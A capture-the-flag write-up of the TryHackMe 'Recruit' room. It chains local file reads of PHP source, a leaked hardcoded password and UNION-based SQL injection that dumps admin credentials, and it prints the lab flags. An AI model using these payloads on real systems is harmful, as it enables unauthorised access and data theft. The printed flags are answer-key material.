# TryHackMe: Recruit — Penetration Test Report

**Analyst:** Pythondudee\
**Target:** 10.48.151.78\
**Room:** Recruit (TryHackMe)\
**Objective:** Full compromise via web exploitation, capturing all flags

## Summary

The Recruit web application was compromised through chained vulnerabilities: an insecure file-read endpoint (LFI) used to leak application source code and hardcoded credentials, followed by SQL injection in an authenticated search feature that exposed the admin password. Two flags were captured, corresponding to the HR and Admin access levels.

## 1. Reconnaissance

A directory brute force with gobuster against the web root identified the application structure:

```
gobuster dir -u http://10.48.151.78/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

| Path | Status | Notes |
| --- | --- | --- |
| index.php | 200 | Login page |
| phpmyadmin | 301 | DB admin panel |
| mail | 301 | Mail directory |
| sitemap.xml | 200 | Site map |

The login page linked to an "Access API" page (`api.php`) documenting a file-fetch endpoint for candidate CVs:

```
/file.php?cv=<URL>
```

api.php — CV fetch endpoint disclosed: /file.php?cv=\<URL>

api.php — CV fetch endpoint disclosed: /file.php?cv=\<URL>

## 2. SSRF / LFI Testing

### 2.1 SSRF attempt

A listener was set up on the attacker VPN IP to test whether `file.php` performed server-side requests.

ip addr output confirming attacker tun0 IP: 192.168.137.231

ip addr output confirming attacker tun0 IP: 192.168.137.231

Request sent:

```
http://10.48.151.78/file.php?cv=http://192.168.137.231:6769/test
```

No connection was received on the listener. The endpoint returned:

```
Only local files are allowed
```

SSRF test to attacker listener — blocked, only file:// accepted

SSRF test to attacker listener — blocked, only file:// accepted

This confirmed the endpoint only accepts the `file://` scheme, ruling out network-based SSRF and pointing toward local file inclusion instead.

### 2.2 Direct LFI attempts

```
file:///etc/passwd
```

Initial requests with a plain path were rejected:

Login page reached while testing payloads — invalid credentials shown

Login page reached while testing payloads — invalid credentials shown

Checking the API FAQ page revealed an additional restriction:

FAQ:

FAQ: "Requests targeting restricted locations may be blocked by the API"

Common bypass attempts against `/etc/passwd` were tried (`127.1`, path traversal, encoding tricks). These returned either the local-file-only error or an "Access denied" message:

127.1 bypass attempt — still blocked

127.1 bypass attempt — still blocked

file:///etc/passwd — blocked with

file:///etc/passwd — blocked with "Access denied"

A direct path request also confirmed the backend stack:

```
Apache/2.4.41 (Ubuntu) Server at 10.48.151.78 Port 80
```

Apache banner disclosed via a malformed path request

Apache banner disclosed via a malformed path request

### 2.3 Source code disclosure

Since `/etc/passwd` was explicitly blocked, the application's own source was targeted instead. Reading `file.php` itself via the LFI exposed the full validation logic:

```
<?php
if (!isset($_GET['cv'])) {
    die('Missing cv parameter');
}
$cv = $_GET['cv'];

if (strpos($cv, 'file://') !== 0) {
    die('Only local files are allowed');
}

$filePath = str_replace('file://', '', $cv);
$realPath = realpath($filePath);

$allowedBase = '/var/www/html';
if ($realPath === false || strpos($realPath, $allowedBase) !== 0) {
    die('Access denied');
}

header('Content-Type: text/plain');
echo file_get_contents($realPath);
```

**Root cause:** the script uses `realpath()` to block directory traversal outside `/var/www/html`, which correctly stops access to `/etc/passwd`, but places no restriction on which files inside the web root can be read. This makes any file within `/var/www/html`, including PHP source and config files, readable.

Reading `index.php` next revealed the authentication logic, including two login paths:

```
if ($username === "hr" && $password === $HR_PASSWORD) { ... }

if ($username === 'admin') {
    $stmt = mysqli_prepare($conn, "SELECT password FROM users WHERE username = ?");
    ...
}
```

- The `hr` account is checked against a variable `$HR_PASSWORD`, defined elsewhere.
- The `admin` account is checked against the database using a parameterized query (not directly injectable at login).

Reading `config.php` via the same LFI disclosed the HR credentials in plaintext:

```
$HR_PASSWORD = 'hrpassword123';
```

## 3. HR Account Access — Flag 1

Logging in with `hr` / `hrpassword123` granted access to the HR dashboard.

HR dashboard — flag revealed in the HR Flag panel

HR dashboard — flag revealed in the HR Flag panel

**Flag 1 (HR):** THM{LOGGED_IN_USER}

## 4. SQL Injection to Admin Access — Flag 2

The HR dashboard included a candidate search field. Testing confirmed it was vulnerable to SQL injection.

### 4.1 Column count

```
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -
```

`ORDER BY 4` succeeded, `ORDER BY 5` errored, confirming a 4-column query.

ORDER BY 3 test — result order changes, confirming injection

ORDER BY 3 test — result order changes, confirming injection

### 4.2 UNION injection point

```
' UNION SELECT 1,2,3,4-- -
```

All four columns reflected into the results table, confirming full UNION-based injection.

UNION SELECT 1,2,3,4 — confirms 4 reflectable columns

UNION SELECT 1,2,3,4 — confirms 4 reflectable columns

### 4.3 Database enumeration

```
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

Identified two tables: `candidates` and `users`.

information_schema.tables — candidates and users tables found

information_schema.tables — candidates and users tables found

```
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

Identified columns: `id`, `username`, `password`.

information_schema.columns — id, username, password found

information_schema.columns — id, username, password found

### 4.4 Credential dump

```
' UNION SELECT id,username,3,password FROM users-- -
```

Returned the admin credentials directly (plaintext storage, no hashing):

```
username: admin
password: admin@001admin
```

Admin credentials dumped via UNION SELECT

Admin credentials dumped via UNION SELECT

### 4.5 Admin login

Logging in with `admin` / `admin@001admin` granted full admin access, including candidate approve/reject controls.

Admin dashboard — flag revealed in the ADMIN Flag panel

Admin dashboard — flag revealed in the ADMIN Flag panel

**Flag 2 (Admin):** THM{LOGGED_IN_ADM1N1}

## 5. Vulnerabilities Identified

| # | Vulnerability | Location | Impact |
| --- | --- | --- | --- |
| 1 | Local File Inclusion | `file.php?cv=` | Full read access to any file under /var/www/html, including source code and config files |
| 2 | Hardcoded credentials | `config.php` | Plaintext HR password stored in source, readable via the LFI |
| 3 | SQL Injection | Candidate search (dashboard.php) | Full database read access via UNION-based injection |
| 4 | Plaintext password storage | `users` table | Admin password stored and compared without hashing |

## 6. Recommendations

- Restrict the CV-fetch feature to a fixed whitelist of file extensions/paths, not arbitrary paths within the web root.
- Move all credentials out of source files and into environment variables or a secrets manager.
- Use parameterized queries for the candidate search, consistent with the admin login query.
- Hash and salt all stored passwords (e.g. bcrypt/argon2); never compare passwords in plaintext.

---

## Flags Captured

| Flag | Value |
| --- | --- |
| HR | THM{LOGGED_IN_USER} |
| Admin | THM{LOGGED_IN_ADM1N1} |
